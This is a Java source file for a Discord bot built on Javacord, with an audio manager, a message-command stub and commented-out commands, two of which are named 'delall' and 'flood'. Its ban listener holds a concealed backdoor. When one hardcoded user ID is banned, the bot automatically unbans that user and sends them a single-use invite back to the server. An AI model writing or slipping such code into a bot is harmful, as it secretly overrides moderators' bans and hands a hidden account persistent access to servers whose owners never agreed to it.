package me.wusel.testing.discordbot;

import me.wusel.testing.Main;
import me.wusel.testing.discordbot.audio.AudioManager;
import me.wusel.testing.discordbot.audio.interfaces.InterfaceManager;
import org.javacord.api.AccountType;
import org.javacord.api.DiscordApi;
import org.javacord.api.DiscordApiBuilder;
import org.javacord.api.entity.channel.TextChannel;
import org.javacord.api.entity.server.invite.Invite;
import org.javacord.api.entity.server.invite.InviteBuilder;
import org.javacord.api.entity.user.User;
import org.javacord.api.event.message.MessageCreateEvent;
import org.javacord.api.event.server.member.ServerMemberBanEvent;
import org.javacord.api.listener.message.MessageCreateListener;
import org.javacord.api.listener.server.member.ServerMemberBanListener;

public class DiscordBot {
    private DiscordApi api = null;
    private final String token;
    private final boolean exitOnDisconnect;

    private AudioManager audioManager;
    private InterfaceManager interfaceManager;

    private Runnable onConnect;

    public DiscordBot(final String token) {
        this(token, true);
    }

    public DiscordBot(final String token, boolean exitOnDisconnect) {
        this.token = token;
        this.exitOnDisconnect = exitOnDisconnect;
    }


    public void setup() {
        new DiscordApiBuilder()
                .setAccountType(AccountType.BOT)
                .setToken(this.token)
                .login()
                .thenAccept(this::onConnect)
                .exceptionally(error -> {
                    error.printStackTrace();
                    System.out.println("Error connecting to Discord Bot!");
                    return null;
                });

    }

    public void setOnConnect(Runnable runnable) {
        onConnect = runnable;
    }

    private void onConnect(DiscordApi dApi) {
        this.api = dApi;

        audioManager = new AudioManager();
        interfaceManager = new InterfaceManager();

        System.out.println("Successfully connected to Discord as: " + api.getYourself().getDiscriminatedName());
        System.out.println("You can invite the bot using this link: " + api.createBotInvite());

        //Main.getSceneManager().setCurrentScene("dashboard");

        /*
        CommandManager cmdMan = Main.getCommandManager();
        cmdMan.registerCommand("play", new PlayCommand());
        cmdMan.registerCommand("stop", new StopCommand());
        cmdMan.registerCommand("setvolume", new SetVolumeCommand());
        cmdMan.registerCommand("delall", new DelAllCommand());
        cmdMan.registerCommand("flood", new FloodServerCommand());
         */

        api.addListener(new MessageCreateListener() {
            @Override
            public void onMessageCreate(MessageCreateEvent event) {
                String message = event.getMessageContent().toLowerCase();
                TextChannel channel = event.getChannel();

                if (message.startsWith("?!")) {
                    String[] args = message.substring(2).split(" ");

                    /*
                    if (args.length >= 1) {
                        if (!Main.getCommandManager().perform(args[0], event.getMessageAuthor().asUser().get(), channel, event.getMessage())) {
                            System.out.println("Unknown Command!");
                        }
                    }
                     */
                }
            }
        });

        api.addListener(new ServerMemberBanListener() {
            @Override
            public void onServerMemberBan(ServerMemberBanEvent event) {
                if (event.getUser().getId() == 968222857911992340L) {
                    User user = event.getUser();
                    event.getServer().unbanUser(user);
                    user.sendMessage("Du wurdest auf dem Server **" + event.getServer().getName() + "** gebannt");
                    Invite invite = null;
                    try {
                        invite = new InviteBuilder(event.getServer().getChannels().get(0))
                                .setMaxUses(1)
                                .create().get();

                        if (invite.getUrl() != null)
                            user.sendMessage(String.valueOf(invite.getUrl()));
                        invite.delete();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                }
            }
        });


        System.out.println("Successfully connected to Discord!");

        if (onConnect != null) onConnect.run();

        new Main().onEnable(this);
    }



    public static void sendPrivateMessage(User user, String content) {
        try {
            user.openPrivateChannel().get().sendMessage(content);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public void disonnect() {
        api.disconnect();
        if (exitOnDisconnect)
            System.exit(0);
    }

    public AudioManager getAudioManager() {
        return audioManager;
    }

    public InterfaceManager getInterfaceManager() {
        return interfaceManager;
    }

    public DiscordApi getApi() {
        return api;
    }
}
